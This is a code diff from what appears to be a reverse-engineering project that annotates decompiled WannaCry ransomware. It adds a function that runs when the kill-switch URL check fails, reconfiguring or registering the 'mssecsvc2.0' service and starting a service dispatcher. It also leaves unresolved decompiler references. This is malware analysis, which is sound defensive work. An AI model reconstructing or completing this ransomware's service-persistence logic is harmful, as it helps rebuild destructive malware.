@@ -3,6 +3,10 @@
 #include <string.h>
 #include <stdlib.h>
 
+// Functions Called
+void Create_SvcsConfigs(void);
+
+
 // arguments to GetProcAddress
 char CreateProcessA_str[] = "CreateProcessA";
 char CreateFileA_str[] = "CreateFileA";
@@ -41,8 +45,7 @@ int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nSho
   weird_url_cpy2 = local_50;
   
   strcpy( weird_url_cpy2 , weird_url_cp );
-  
-  *(char *)weird_url_cpy2 = *werid_url_cp;
+  // *(char *)weird_url_cpy2 = *werid_url_cp;
   
   local_17 = 0;
   local_13 = 0;
@@ -59,11 +62,45 @@ int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nSho
   if (internet_open_url_HANDLE == (HINTERNET)0x0) {
     InternetCloseHandle(hInternet);
     InternetCloseHandle(0);
-    FUN_00408090();
+    Create_SvcsConfigs();
                     /* else, connect, and do nothing */
     return 0;
   }
   InternetCloseHandle(hInternet);
   InternetCloseHandle(internet_open_url_HANDLE);
   return 0;
+}
+
+
+void Create_SvcsConfigs(void)
+{
+     int *argc;
+  SC_HANDLE openSCManagerH;
+  SC_HANDLE OpenServiceH;
+  SERVICE_TABLE_ENTRYA TEntry_Dispatcher;
+  
+                    /* get the path of the current running process */
+  GetModuleFileNameA((HMODULE)0x0,(LPSTR)&wannacry_exe_path,260);
+  argc = (int *)__p___argc();
+                    /* if you runned the process without any arg, i.e. C:\path\to\wanacry */
+  if (*argc < 2) {
+    FUN_00407f20();
+                    /* else... */
+    return;
+  }
+  openSCManagerH = OpenSCManagerA((LPCSTR)0x0,(LPCSTR)0x0,983103);
+                    /* in sucess... */
+  if (openSCManagerH != (SC_HANDLE)0x0) {
+    OpenServiceH = OpenServiceA(openSCManagerH,mssecsvc2_0_string,983551);
+                    /* in success... */
+    if (OpenServiceH != (SC_HANDLE)0x0) {
+      change_wannacry_service_configs(OpenServiceH,60);
+      CloseServiceHandle(OpenServiceH);
+    }
+    CloseServiceHandle(openSCManagerH);
+  }
+  TEntry_Dispatcher.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)&LAB_00408000;
+  TEntry_Dispatcher.lpServiceName = mssecsvc2_0_string;
+  StartServiceCtrlDispatcherA(&TEntry_Dispatcher);
+  return;
 }
